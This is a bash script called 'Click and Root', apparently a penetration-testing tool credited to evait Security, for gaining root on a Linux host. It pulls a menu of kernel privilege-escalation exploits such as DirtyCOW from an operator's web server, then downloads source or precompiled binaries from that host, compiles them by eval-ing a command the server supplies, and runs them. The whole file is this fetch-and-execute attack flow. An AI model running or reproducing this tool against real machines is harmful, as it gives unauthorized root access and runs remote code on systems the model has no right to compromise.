#!/bin/bash

GREEN='\033[1;32m'
WHITE='\033[1;37m'
RED='\033[0;31m'
NC='\033[0m'		#No Colour

vNr="1.1"
COUNTER=0
COUNT=0
command=""

function version {
	echo -e "${GREEN}	########################################"
	echo -e "${GREEN}	#           ${RED}Click and Root             ${GREEN}#"
	echo -e "${GREEN}	#     ${NC}Copyright © evait Security       ${GREEN}#"
	echo -e "${GREEN}	#       ${NC}Thanks to DarkPringles         ${GREEN}#"
	echo -e "${GREEN}	# 				       #"
	echo -e "${GREEN}	#	     ${NC}Version ${vNr}   	       ${GREEN}#"
	echo -e "${GREEN}	########################################${NC}\n"
}

function helper {
	echo -e "${NC}Usage:\n\t${GREEN}Start Webserver with click_n_root Folder\n\t${NC}click_n_root.sh <webserver(:port)/folder>"
	echo -e "Example:\n${GREEN}\t./click_n_root.sh 192.168.0.1:80/click_n_root\n${NC}"
	echo -e "Parameters:\n\t-h \t--help\tShows this help and exits"
	echo -e "\t-v \t\tPrints version and exits\n"
}

function tester {
	if [[ -z $1 ]]; then
		echo -e "\n${RED}Server not reachable or Folder incomplete!${NC}\n"
		exit
	fi
}

if [[ "$1" == "-h" ]] || [[ "$1" == "--help" ]] ; then
	helper
	exit
fi

if [[ -z "$1" ]] ; then
	version
	helper
	exit
fi

if [[ "$1" == "-v" ]]; then
	version
	exit
fi



version
server_test=$(curl -s $1)
tester $server_test
echo -e "[*] OS and Kernel Information:\n$(uname -mrs)\n"

list=$(curl -s $1/list.yml)
tester $list

# line after line reading of: list.yml
printf "\n%-6s %-20s %-35s %-30s\n" "N°" " Name" " Affected Kernel/Systems" " Additional Comments"
IFS=$'\n' 
for i in $(echo -e "$list");
do

	number=$(echo "$i" | cut -d '|' -f 1)
	name=$(echo "$i" | cut -d '|' -f 2)
	system=$(echo "$i" | cut -d '|' -f 3)
	comment=$(echo "$i" | cut -d '|' -f 4)
	printf "\n%-6s %-20s %-35s %-30s" "[$number]" $name $system $comment
	let COUNTER=COUNTER+1
done
echo -e "\n------------------------------------------------------------------------------------------------"
echo "[88]  Unix Privilege Escalation Check Script"
echo "[99]  Source download and compile directly"
echo -e "${GREEN}[*] Choose your Exploit(Number): ${NC}"
read nr
echo ""

# If Unix Privilege Escalation Check Sript is choosen
if [ $nr -eq 88 ]
	then
	cd /tmp/
	echo -e "${GREEN}[*] Downloading Script ...${NC}"
	curl -O $1/unix-privesc-check
	echo -e "${GREEN}[*] Set Permissions ...${NC}"
	chmod 777 unix-privesc-check
	echo -e "${GREEN}[*] Execute Script ... wait for finish ...${NC}"
	./unix-privesc-check standard >> output.txt
	echo -e "${GREEN}[*] Execution completed. Output file is: output.txt${NC}"
	echo -e "${GREEN}[*] Cleaning directory ...${NC}"
	rm -f unix-privesc-check
	echo -e "${GREEN}[*] Searching for problems ...${NC}"
	echo ""	
	cat output.txt | grep WARNING:
	exit
fi


# Direct local compile of Exploits
if [ $nr -eq 99 ]
	then
	echo -e "${GREEN}[*]Choose Exploit to download and compile: ${NC}"
	read src
	echo ""
	if [ $src -gt $COUNTER ]
		then
		echo -e "${RED}[!]${NC} No Exploit with N° $src found!\tExiting!"
		exit
	fi
	echo -e "${GREEN}[*] Creating Folder /tmp/down${NC}" 
	mkdir /tmp/down
	echo -e "${GREEN}[*] Downloading Exploit to /tmp/down${NC}" 
	curl $1/$src/exploit.c > /tmp/down/exploit.c
	for i in $(echo -e "$list");
	do
		let COUNT=COUNT+1
		if [ $COUNT -eq $src ]
			then 
			command=$(echo "$i" | cut -d '|' -f 5)
			cd /tmp/down
			echo -e "${GREEN}[*] Compile Exploit with $command${NC}" 			
			eval $command
			echo -e "${GREEN}[*] Executing exploit${NC}"
			chmod +x exploit

			# Exploit needs special arguments	
			if [ $src -eq 12 ]
				then
				./exploit -t 127.0.0.1
				
			elif [ $src -eq 2 ]
				then
				./exploit pokeball milltank
				
			else
				./exploit
				
			fi			
	    	fi		
	done	
fi

## Loading precompiled Exploit (only x64 and x86)

arch=$(uname -m)

if [ $nr -gt $COUNTER ]
	then
	echo -e "${RED}[!]${NC} No Exploit with N° $src found! Exiting!"
	exit
fi
echo -e "${GREEN}[*] Creating Folder /tmp/down${NC}" 
mkdir /tmp/down
echo -e "${GREEN}[*] Found Architecture $arch ${NC}"
echo -e "${GREEN}[*] Downloading pre-compiled exploit to /tmp/down${NC}"

# Architecture: 64 Bit
if [ "$arch" = "x86_64" ]
	then
	cd /tmp/down
	curl -O $1/$nr/exploit_64
	echo -e "${GREEN}[*] Executing Exploit ...${NC}"
	chmod +x exploit_64
	
	# Exploit needs special arguments	
	if [ $nr -eq 12 ]
		then
		./exploit_64 -t 127.0.0.1
		
	elif [ $nr -eq 2 ]
		then
		./exploit_64 pokeball milltank
		
	else
		./exploit_64
		
	fi

#Architecture: 32 Bit
elif [ "$arch" = "i386" ]
	then
	cd /tmp/down
	curl -O $1/$nr/exploit_32
	echo -e "${GREEN}[*] Executing Exploit ...${NC}"
	chmod +x exploit_32

	# Exploit needs special arguments	
	if [ $nr -eq 12 ]
		then
		./exploit_32 -t 127.0.0.1
		
	elif [ $nr -eq 2 ]
		then
		./exploit_32 pokeball milltank
		
	else
		./exploit_32
		
	fi
else
	#No supported Architecture found
	echo -e "[${RED}!${NC}] Unsupported Architecture found! Choose direct compile next Time!\Exiting!"
fi
 

#printf "\n%-3s %-20s %-35s %-30s\n" "01" "DirtyCOW AddUser" "Ubuntu <4.4/<3.13; Debian <4.7.8" "default: evait:kill"




exit
